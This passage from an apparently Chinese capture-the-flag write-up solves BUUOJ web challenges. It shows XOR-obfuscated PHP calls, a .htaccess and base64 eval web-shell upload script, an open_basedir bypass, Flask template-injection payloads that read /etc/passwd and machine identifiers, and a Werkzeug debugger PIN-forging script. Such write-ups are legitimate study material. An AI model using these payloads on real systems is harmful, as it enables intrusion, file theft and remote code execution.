class="symbol">'a7*e0</span>', <span class="symbol">'a8*ef</span>', <span class="symbol">'a9*ee</span>', <span class="symbol">'aa*ed</span>', <span class="symbol">'ab*ec</span>', <span class="symbol">'ac*eb</span>', <span class="symbol">'ad*ea</span>', <span class="symbol">'ae*e9</span>', <span class="symbol">'af*e8</span>', <span class="symbol">'b0*f7</span>', <span class="symbol">'b1*f6</span>', <span class="symbol">'b2*f5</span>', <span class="symbol">'b3*f4</span>', <span class="symbol">'b4*f3</span>', <span class="symbol">'b5*f2</span>', <span class="symbol">'b6*f1</span>', <span class="symbol">'b7*f0</span>', <span class="symbol">'b8*ff</span>', <span class="symbol">'b9*fe</span>', <span class="symbol">'ba*fd</span>', <span class="symbol">'bb*fc</span>', <span class="symbol">'bc*fb</span>', <span class="symbol">'bd*fa</span>', <span class="symbol">'be*f9</span>', <span class="symbol">'bf*f8</span>', <span class="symbol">'c0*87</span>', <span class="symbol">'c1*86</span>', <span class="symbol">'c8*8f</span>', <span class="symbol">'c9*8e</span>', <span class="symbol">'ca*8d</span>', <span class="symbol">'cb*8c</span>', <span class="symbol">'cc*8b</span>', <span class="symbol">'cd*8a</span>', <span class="symbol">'ce*89</span>', <span class="symbol">'cf*88</span>', <span class="symbol">'d0*97</span>', <span class="symbol">'d1*96</span>', <span class="symbol">'d2*95</span>', <span class="symbol">'d3*94</span>', <span class="symbol">'d4*93</span>', <span class="symbol">'d5*92</span>', <span class="symbol">'d6*91</span>', <span class="symbol">'d7*90</span>', <span class="symbol">'d8*9f</span>', <span class="symbol">'d9*9e</span>', <span class="symbol">'da*9d</span>', <span class="symbol">'db*9c</span>', <span class="symbol">'dc*9b</span>', <span class="symbol">'dd*9a</span>', <span class="symbol">'de*99</span>', <span class="symbol">'df*98</span>', <span class="symbol">'e0*a7</span>', <span class="symbol">'e1*a6</span>', <span class="symbol">'e2*a5</span>', <span class="symbol">'e3*a4</span>', <span class="symbol">'e4*a3</span>', <span class="symbol">'e5*a2</span>', <span class="symbol">'e6*a1</span>', <span class="symbol">'e7*a0</span>', <span class="symbol">'e8*af</span>', <span class="symbol">'e9*ae</span>', <span class="symbol">'ea*ad</span>', <span class="symbol">'eb*ac</span>', <span class="symbol">'ec*ab</span>', <span class="symbol">'ed*aa</span>', <span class="symbol">'ee*a9</span>', <span class="symbol">'ef*a8</span>', <span class="symbol">'f0*b7</span>', <span class="symbol">'f1*b6</span>', <span class="symbol">'f2*b5</span>', <span class="symbol">'f3*b4</span>', <span class="symbol">'f4*b3</span>', <span class="symbol">'f5*b2</span>', <span class="symbol">'f6*b1</span>', <span class="symbol">'f7*b0</span>', <span class="symbol">'f8*bf</span>', <span class="symbol">'f9*be</span>', <span class="symbol">'fa*bd</span>', <span class="symbol">'fb*bc</span>', <span class="symbol">'fc*bb</span>', <span class="symbol">'fd*ba</span>', <span class="symbol">'fe*b9</span>', <span class="symbol">'ff*b8</span>']</span><br><span class="line">[<span class="symbol">'86*c3</span>', <span class="symbol">'87*c2</span>', <span class="symbol">'88*cd</span>', <span class="symbol">'89*cc</span>', <span class="symbol">'8a*cf</span>', <span class="symbol">'8b*ce</span>', <span class="symbol">'8c*c9</span>', <span class="symbol">'8d*c8</span>', <span class="symbol">'8e*cb</span>', <span class="symbol">'8f*ca</span>', <span class="symbol">'90*d5</span>', <span class="symbol">'91*d4</span>', <span class="symbol">'92*d7</span>', <span class="symbol">'93*d6</span>', <span class="symbol">'94*d1</span>', <span class="symbol">'95*d0</span>', <span class="symbol">'96*d3</span>', <span class="symbol">'97*d2</span>', <span class="symbol">'98*dd</span>', <span class="symbol">'99*dc</span>', <span class="symbol">'9a*df</span>', <span class="symbol">'9b*de</span>', <span class="symbol">'9c*d9</span>', <span class="symbol">'9d*d8</span>', <span class="symbol">'9e*db</span>', <span class="symbol">'9f*da</span>', <span class="symbol">'a0*e5</span>', <span class="symbol">'a1*e4</span>', <span class="symbol">'a2*e7</span>', <span class="symbol">'a3*e6</span>', <span class="symbol">'a4*e1</span>', <span class="symbol">'a5*e0</span>', <span class="symbol">'a6*e3</span>', <span class="symbol">'a7*e2</span>', <span class="symbol">'a8*ed</span>', <span class="symbol">'a9*ec</span>', <span class="symbol">'aa*ef</span>', <span class="symbol">'ab*ee</span>', <span class="symbol">'ac*e9</span>', <span class="symbol">'ad*e8</span>', <span class="symbol">'ae*eb</span>', <span class="symbol">'af*ea</span>', <span class="symbol">'b0*f5</span>', <span class="symbol">'b1*f4</span>', <span class="symbol">'b2*f7</span>', <span class="symbol">'b3*f6</span>', <span class="symbol">'b4*f1</span>', <span class="symbol">'b5*f0</span>', <span class="symbol">'b6*f3</span>', <span class="symbol">'b7*f2</span>', <span class="symbol">'b8*fd</span>', <span class="symbol">'b9*fc</span>', <span class="symbol">'ba*ff</span>', <span class="symbol">'bb*fe</span>', <span class="symbol">'bc*f9</span>', <span class="symbol">'bd*f8</span>', <span class="symbol">'be*fb</span>', <span class="symbol">'bf*fa</span>', <span class="symbol">'c2*87</span>', <span class="symbol">'c3*86</span>', <span class="symbol">'c8*8d</span>', <span class="symbol">'c9*8c</span>', <span class="symbol">'ca*8f</span>', <span class="symbol">'cb*8e</span>', <span class="symbol">'cc*89</span>', <span class="symbol">'cd*88</span>', <span class="symbol">'ce*8b</span>', <span class="symbol">'cf*8a</span>', <span class="symbol">'d0*95</span>', <span class="symbol">'d1*94</span>', <span class="symbol">'d2*97</span>', <span class="symbol">'d3*96</span>', <span class="symbol">'d4*91</span>', <span class="symbol">'d5*90</span>', <span class="symbol">'d6*93</span>', <span class="symbol">'d7*92</span>', <span class="symbol">'d8*9d</span>', <span class="symbol">'d9*9c</span>', <span class="symbol">'da*9f</span>', <span class="symbol">'db*9e</span>', <span class="symbol">'dc*99</span>', <span class="symbol">'dd*98</span>', <span class="symbol">'de*9b</span>', <span class="symbol">'df*9a</span>', <span class="symbol">'e0*a5</span>', <span class="symbol">'e1*a4</span>', <span class="symbol">'e2*a7</span>', <span class="symbol">'e3*a6</span>', <span class="symbol">'e4*a1</span>', <span class="symbol">'e5*a0</span>', <span class="symbol">'e6*a3</span>', <span class="symbol">'e7*a2</span>', <span class="symbol">'e8*ad</span>', <span class="symbol">'e9*ac</span>', <span class="symbol">'ea*af</span>', <span class="symbol">'eb*ae</span>', <span class="symbol">'ec*a9</span>', <span class="symbol">'ed*a8</span>', <span class="symbol">'ee*ab</span>', <span class="symbol">'ef*aa</span>', <span class="symbol">'f0*b5</span>', <span class="symbol">'f1*b4</span>', <span class="symbol">'f2*b7</span>', <span class="symbol">'f3*b6</span>', <span class="symbol">'f4*b1</span>', <span class="symbol">'f5*b0</span>', <span class="symbol">'f6*b3</span>', <span class="symbol">'f7*b2</span>', <span class="symbol">'f8*bd</span>', <span class="symbol">'f9*bc</span>', <span class="symbol">'fa*bf</span>', <span class="symbol">'fb*be</span>', <span class="symbol">'fc*b9</span>', <span class="symbol">'fd*b8</span>', <span class="symbol">'fe*bb</span>', <span class="symbol">'ff*ba</span>']</span><br><span class="line">[<span class="symbol">'86*d2</span>', <span class="symbol">'87*d3</span>', <span class="symbol">'88*dc</span>', <span class="symbol">'89*dd</span>', <span class="symbol">'8a*de</span>', <span class="symbol">'8b*df</span>', <span class="symbol">'8c*d8</span>', <span class="symbol">'8d*d9</span>', <span class="symbol">'8e*da</span>', <span class="symbol">'8f*db</span>', <span class="symbol">'90*c4</span>', <span class="symbol">'91*c5</span>', <span class="symbol">'92*c6</span>', <span class="symbol">'93*c7</span>', <span class="symbol">'94*c0</span>', <span class="symbol">'95*c1</span>', <span class="symbol">'96*c2</span>', <span class="symbol">'97*c3</span>', <span class="symbol">'98*cc</span>', <span class="symbol">'99*cd</span>', <span class="symbol">'9a*ce</span>', <span class="symbol">'9b*cf</span>', <span class="symbol">'9c*c8</span>', <span class="symbol">'9d*c9</span>', <span class="symbol">'9e*ca</span>', <span class="symbol">'9f*cb</span>', <span class="symbol">'a0*f4</span>', <span class="symbol">'a1*f5</span>', <span class="symbol">'a2*f6</span>', <span class="symbol">'a3*f7</span>', <span class="symbol">'a4*f0</span>', <span class="symbol">'a5*f1</span>', <span class="symbol">'a6*f2</span>', <span class="symbol">'a7*f3</span>', <span class="symbol">'a8*fc</span>', <span class="symbol">'a9*fd</span>', <span class="symbol">'aa*fe</span>', <span class="symbol">'ab*ff</span>', <span class="symbol">'ac*f8</span>', <span class="symbol">'ad*f9</span>', <span class="symbol">'ae*fa</span>', <span class="symbol">'af*fb</span>', <span class="symbol">'b0*e4</span>', <span class="symbol">'b1*e5</span>', <span class="symbol">'b2*e6</span>', <span class="symbol">'b3*e7</span>', <span class="symbol">'b4*e0</span>', <span class="symbol">'b5*e1</span>', <span class="symbol">'b6*e2</span>', <span class="symbol">'b7*e3</span>', <span class="symbol">'b8*ec</span>', <span class="symbol">'b9*ed</span>', <span class="symbol">'ba*ee</span>', <span class="symbol">'bb*ef</span>', <span class="symbol">'bc*e8</span>', <span class="symbol">'bd*e9</span>', <span class="symbol">'be*ea</span>', <span class="symbol">'bf*eb</span>', <span class="symbol">'c0*94</span>', <span class="symbol">'c1*95</span>', <span class="symbol">'c2*96</span>', <span class="symbol">'c3*97</span>', <span class="symbol">'c4*90</span>', <span class="symbol">'c5*91</span>', <span class="symbol">'c6*92</span>', <span class="symbol">'c7*93</span>', <span class="symbol">'c8*9c</span>', <span class="symbol">'c9*9d</span>', <span class="symbol">'ca*9e</span>', <span class="symbol">'cb*9f</span>', <span class="symbol">'cc*98</span>', <span class="symbol">'cd*99</span>', <span class="symbol">'ce*9a</span>', <span class="symbol">'cf*9b</span>', <span class="symbol">'d2*86</span>', <span class="symbol">'d3*87</span>', <span class="symbol">'d8*8c</span>', <span class="symbol">'d9*8d</span>', <span class="symbol">'da*8e</span>', <span class="symbol">'db*8f</span>', <span class="symbol">'dc*88</span>', <span class="symbol">'dd*89</span>', <span class="symbol">'de*8a</span>', <span class="symbol">'df*8b</span>', <span class="symbol">'e0*b4</span>', <span class="symbol">'e1*b5</span>', <span class="symbol">'e2*b6</span>', <span class="symbol">'e3*b7</span>', <span class="symbol">'e4*b0</span>', <span class="symbol">'e5*b1</span>', <span class="symbol">'e6*b2</span>', <span class="symbol">'e7*b3</span>', <span class="symbol">'e8*bc</span>', <span class="symbol">'e9*bd</span>', <span class="symbol">'ea*be</span>', <span class="symbol">'eb*bf</span>', <span class="symbol">'ec*b8</span>', <span class="symbol">'ed*b9</span>', <span class="symbol">'ee*ba</span>', <span class="symbol">'ef*bb</span>', <span class="symbol">'f0*a4</span>', <span class="symbol">'f1*a5</span>', <span class="symbol">'f2*a6</span>', <span class="symbol">'f3*a7</span>', <span class="symbol">'f4*a0</span>', <span class="symbol">'f5*a1</span>', <span class="symbol">'f6*a2</span>', <span class="symbol">'f7*a3</span>', <span class="symbol">'f8*ac</span>', <span class="symbol">'f9*ad</span>', <span class="symbol">'fa*ae</span>', <span class="symbol">'fb*af</span>', <span class="symbol">'fc*a8</span>', <span class="symbol">'fd*a9</span>', <span class="symbol">'fe*aa</span>', <span class="symbol">'ff*ab</span>']</span><br></pre></td></tr></table></figure>

<p>之后就可以开始构造了</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span><span class="meta">%</span><span class="number">86</span>^<span class="meta">%</span>d<span class="number">9</span><span class="meta">%</span>c<span class="number">1</span><span class="meta">%</span>c<span class="number">3</span><span class="meta">%</span>d<span class="number">2</span>&#125;&#123;<span class="meta">%</span><span class="number">86</span>&#125;<span class="comment">()</span>;&amp;<span class="meta">%</span><span class="number">86</span>=phpi<span class="symbol">nfo</span></span><br></pre></td></tr></table></figure>

<p>成功执行<br><img src="/2020/05/16/BUU-web5/1589591086671.png" alt="1589591086671"></p>
<p>这样便可以调用<code>get_the_flag</code>函数，之后是绕过文件上传，这个为apache服务器，所以可以上传.htaccess文件</p>
<p>因为<code>php = 7.2</code>所以不能用<code>&lt;script&gt;</code>来绕过文件内容（&lt;?）过滤。在上面<code>phpinfo</code>中可以看，这个为apache服务器，所以可以上传.htaccess文件绕过文件名过滤，然后通过编码解码绕过文件内容过滤。</p>
<p>对于<code>exif_imagetype()</code>的绕过方式：</p>
<ul>
<li>使用<code>\x00\x00\x8a\x39\x8a\x39</code>绕过</li>
<li>使用<code>#define width 1337\n#define height 1337</code>绕过</li>
</ul>
<p>关于<code>.htaccess</code>常见绕过利用可以参考：<a href="https://www.wh1teze.top/articles/2020/02/04/[https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93](https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93)" target="_blank" rel="noopener">.htaccess tricks总结</a></p>
<p>所以构造.htaccess</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .txt   <span class="comment">###将1.test以php的方式解析</span></span><br><span class="line">php_value auto_append_file  <span class="string">"php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663/shell.txt"</span></span><br><span class="line"><span class="comment">##在shell.txt加载完毕后，再次包含base64解码后的shell.txt，成功getshell，所以这也就是为什么会出现两次shell.txt内容的原因，第一次是没有经过base64解密的，第二次是经过解密并且转化为php了的。</span></span><br></pre></td></tr></table></figure>

<p>构造木马文件shell.txt:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">\x00\x00\x8a\x39\x8a\x39</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_GET[<span class="string">'s'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用python进行文件上传：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://e093dc1f-cf88-428e-b48c-8a3a58f5a2c3.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag"</span></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .txt</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_48cd8b43081896fbd0931d204f947663/shell.txt"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['a']);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.txt'</span>,shell,<span class="string">'image/jpeg'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589596932895.png" alt="1589596932895"></p>
<p>上传成功并执行phpinfo()<br><img src="/2020/05/16/BUU-web5/1589596970844.png" alt="1589596970844"></p>
<p>其中禁用了很多函数，所以不能执行命令<br><img src="/2020/05/16/BUU-web5/1589597199043.png" alt="1589597199043"></p>
<p>同时使用<code>open_basedir</code>进行目录访问限制</p>
<p><strong>open_basedir 绕过</strong></p>
<blockquote>
<p>绕过方法大致如下（php5有其它方法）：</p>
<ul>
<li>首先构造一个相对可以上跳的open_basedir 如<code>mkdir(&#39;mayi&#39;); chdir(&#39;mayi&#39;)</code> 当然我们这里有上跳的路径我们直接 <code>chdir(&quot;img&quot;)</code></li>
<li>然后每次操作<code>chdir(&quot;..&quot;)</code>都会进一次open_basedir的比对由于相对路径的问题，每次open_basedir的补全都会上跳。</li>
<li>比如初试open_basedir为/a/b/c/d：</li>
<li>第一次chdir后变为/a/b/c，第二次chdir后变为/a/b，第三次chdir后变为/a　第四次chdir后变为/</li>
<li>那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</li>
</ul>
</blockquote>
<p>先构造</p>
<blockquote>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">chdir</span>(<span class="string">'xxx'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">chdir</span>(<span class="string">'..'</span>);<span class="selector-tag">ini_set</span>(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="selector-tag">var_dump</span>(scandir(<span class="string">'/'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p>得到flag文件名，在读取<br><img src="/2020/05/16/BUU-web5/1589597718976.png" alt="1589597718976"></p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?a=<span class="built_in">chdir</span>(<span class="string">'xxx'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));var_dump(file_get_contents(<span class="string">'/THis_Is_tHe_F14g'</span>));</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/05/16/BUU-web5/1589597781687.png" alt="1589597781687"></p>
<p>参考文章：<a href="https://www.wh1teze.top/articles/2020/02/04/1580806413437.html" target="_blank" rel="noopener">https://www.wh1teze.top/articles/2020/02/04/1580806413437.html</a><br>本来想使用上一个题的方法绕过disable_function，但是使用蚁剑连接后权限不够，所以放弃了</p>
<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>打开靶机是一个base64加密解密网站<br>在解密的地方随便输入一段发现报错并泄露了一部分源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="meta">@app.route('/decode',methods=['POST','GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">'text'</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">"text"</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">"结果 ： &#123;0&#125;"</span>.format(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">"no no no !!"</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'decode'</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        </span><br><span class="line">res =  render_template_string(tmp)</span><br><span class="line"></span><br><span class="line"><span class="comment">##获取我们传的text参数，进行解密，如果可以过waf则执行代码</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589600193445.png" alt="1589600193445"></p>
<p>之后将8加密后进行解密返回nonono!!，再尝试将加密在解密返回<br><img src="/2020/05/16/BUU-web5/1589600318291.png" alt="1589600318291"></p>
<p>说明存在模板注入<br>读取源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'app.py'</span>,<span class="string">'r'</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>发现waf过滤了flag，os等关键字<br><img src="/2020/05/16/BUU-web5/1589612427990.png" alt="1589612427990"></p>
<p><img src="/2020/05/16/BUU-web5/1589612627542.png" alt="1589612627542"></p>
<p>之后利用字符串拼接找目录</p>
<p>发现了this_is_the_flag.txt</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;''.<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">75</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'__builtins__'</span>][<span class="symbol">'__imp'+'ort__'</span>]('o'+'s').listdir('/')&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589612776280.png" alt="1589612776280"></p>
<p><strong>读取使用切片省去了拼接flag的步骤</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">&#123;&#123;c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589612930582.png" alt="1589612930582"></p>
<p><strong>还有一种便是读取pin码</strong></p>
<p><strong>计算pin码的方法</strong></p>
<p>只要拿到<code>pin码</code>就相当于拿到了shell，想要拿到<code>PIN码</code>必须知道：</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">usrname: 就是启动这个 Flask的用户</span><br><span class="line">modname： 一般为flask.app</span><br><span class="line"><span class="function"><span class="title">getattr</span><span class="params">(app, “__name__”, app.__class__.__name__)</span></span>：python该值一般为Flask 值一般不变</span><br><span class="line"><span class="function"><span class="title">getattr</span><span class="params">(mod, <span class="string">'file'</span>, None)</span></span>：为flask目录下的一个app.py的绝对路径</span><br><span class="line">uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</span><br><span class="line"><span class="function"><span class="title">get_machine_id</span><span class="params">()</span></span> ：/etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值</span><br><span class="line">假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值 假如是Docker机 那么为 /proc/self/cgroup docker行</span><br></pre></td></tr></table></figure>

<p><strong>服务器运行flask所登录的用户名</strong></p>
<p> 我们可以查看/etc/passwd文件。使用如下命令</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">102</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/etc/passwd'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以知道是<code>flaskweb</code>用户。</p>
<p><strong>getattr(mod, ‘file’, None)flask目录下的app.py的绝对路径</strong></p>
<p> 根据报错信息我们可以知道:</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">/usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">python3</span>.7/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">flask</span>/<span class="title">app</span>.<span class="title">py</span></span></span><br></pre></td></tr></table></figure>

<p><strong>当前电脑的MAC地址</strong></p>
<p> 我们可以读取<code>/sys/class/net/eth0/address</code>来获得mac的16进制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">102</span>].__init__.__globals__[<span class="string">'open'</span>](<span class="string">'/sys/class/net/eth0/address'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到<code>02:42:ae:01:56:23</code>将其转10进制<code>2485410420259</code>许多工具都不准确，值得注意。</p>
<p><strong>机器的id</strong></p>
<p> linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。<br> 对于docker机则读取读取/proc/self/cgroup获取get_machine_id()(docker后面那段字符串)<br>使用如下:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.<span class="strong">__class__</span>.<span class="strong">__mro__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">102</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'open'</span>](<span class="link">'/proc/self/cgroup'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得知:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="number">695775</span>f<span class="number">45371</span>f<span class="number">74</span>ba<span class="number">02406e7</span>df<span class="number">3</span>fa<span class="number">817</span>d<span class="number">00641</span>a<span class="number">41</span>db<span class="number">503</span>f<span class="number">9e7</span><span class="keyword">c</span><span class="number">79</span>ab<span class="number">04</span>d<span class="number">986</span><span class="keyword">c</span><span class="number">8</span><span class="keyword">c</span></span><br></pre></td></tr></table></figure>

<p><strong>使用脚本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">'flaskweb'</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">'flask.app'</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">'Flask'</span>, <span class="comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span></span><br><span class="line">    <span class="string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="comment"># getattr(mod, '__file__', None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">'2485410420259'</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">'695775f45371f74ba02406e7df3fa817d00641a41db503f9e7c79ab04d986c8c'</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b'cookiesalt'</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">'__wzd'</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b'pinsalt'</span>)</span><br><span class="line">    num = (<span class="string">'%09d'</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">'-'</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">'0'</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure>

<p>得到pin码为<code>155-092-742</code><br><img src="/2020/05/16/BUU-web5/1589613745642.png" alt="1589613745642"></p>
<p>进入报错页面，点击终端按钮，然后输入 pin码<code>155-092-742</code>然后就可以执行python shell了<br>我们使用如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">'cat /this_is_the_flag.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/16/BUU-web5/1589613814849.png" alt="1589613814849"></p>
